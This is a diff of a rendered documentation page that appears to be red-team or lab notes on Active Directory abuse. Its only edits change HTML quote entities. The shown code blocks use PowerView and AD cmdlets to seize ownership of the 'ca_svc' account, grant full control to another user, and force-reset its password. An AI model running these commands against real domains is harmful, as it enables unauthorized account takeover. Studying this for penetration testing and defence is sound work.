@@ -26766,30 +26766,30 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a>
 </span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
 </span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a>
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="nb">Set-DomainObjectOwner</span> <span class="n">-Identity</span> <span class="s1">&#39;ca_svc&#39;</span> <span class="n">-OwnerIdentity</span> <span class="s1">&#39;ryan&#39;</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="nb">Set-DomainObjectOwner</span> <span class="n">-Identity</span> <span class="s1">'ca_svc'</span> <span class="n">-OwnerIdentity</span> <span class="s1">'ryan'</span>
 </span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6"></a>
-</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="nb">Add-DomainObjectAcl</span> <span class="n">-Rights</span> <span class="s1">&#39;All&#39;</span> <span class="n">-TargetIdentity</span> <span class="s2">&quot;ca_svc&quot;</span> <span class="n">-PrincipalIdentity</span> <span class="s2">&quot;ryan&quot;</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="nb">Add-DomainObjectAcl</span> <span class="n">-Rights</span> <span class="s1">'All'</span> <span class="n">-TargetIdentity</span> <span class="s2">"ca_svc"</span> <span class="n">-PrincipalIdentity</span> <span class="s2">"ryan"</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Validate the results:</p>
 <div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
 <span class="normal"><a href="#__codelineno-1-2">2</a></span>
 <span class="normal"><a href="#__codelineno-1-3">3</a></span>
-<span class="normal"><a href="#__codelineno-1-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="nb">Get-DomainUser</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Name</span> <span class="o">-like</span> <span class="s2">&quot;*ryan*&quot;</span> <span class="p">}</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span> <span class="n">Objectsid</span>
+<span class="normal"><a href="#__codelineno-1-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="nb">Get-DomainUser</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Name</span> <span class="o">-like</span> <span class="s2">"*ryan*"</span> <span class="p">}</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span> <span class="n">Objectsid</span>
 </span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a>
 </span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a>
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a><span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="s1">&#39;CA_SVC&#39;</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">ActiveDirectoryRights</span> <span class="o">-eq</span> <span class="s1">&#39;GenericAll&#39;</span> <span class="p">}</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a><span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="s1">'CA_SVC'</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">ActiveDirectoryRights</span> <span class="o">-eq</span> <span class="s1">'GenericAll'</span> <span class="p">}</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Once a user has been granted full control over a target, they can perform actions such as kerberoasting or change the password without knowing the target’s current password (ForceChangePassword).</p>
 <p><strong>Reset User Password</strong></p>
 <p>Using the <strong>PowerView</strong> module, an attacker can reset a domain user’s password. This can be performed with the Set-DomainUserPassword cmdlet, allowing control over a targeted account.</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
-<span class="normal"><a href="#__codelineno-2-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>$NewPassword = ConvertTo-SecureString &#39;Lala123&#39; -AsPlainText -Force
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>Set-DomainUserPassword -Identity &#39;ca_svc&#39; -AccountPassword $NewPassword
+<span class="normal"><a href="#__codelineno-2-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>$NewPassword = ConvertTo-SecureString 'Lala123' -AsPlainText -Force
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>Set-DomainUserPassword -Identity 'ca_svc' -AccountPassword $NewPassword
 </span></code></pre></div></td></tr></table></div>
 <p>Another way, in case Set-DomainUserPassword does not do the trick:</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
-<span class="normal"><a href="#__codelineno-3-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>$NewPassword = ConvertTo-SecureString &#39;WhoKnows123!&#39; -AsPlainText -Force 
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>Set-ADAccountPassword -Identity &#39;ca_svc&#39;  -NewPassword $NewPassword -Reset
+<span class="normal"><a href="#__codelineno-3-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>$NewPassword = ConvertTo-SecureString 'WhoKnows123!' -AsPlainText -Force 
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>Set-ADAccountPassword -Identity 'ca_svc'  -NewPassword $NewPassword -Reset
 </span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
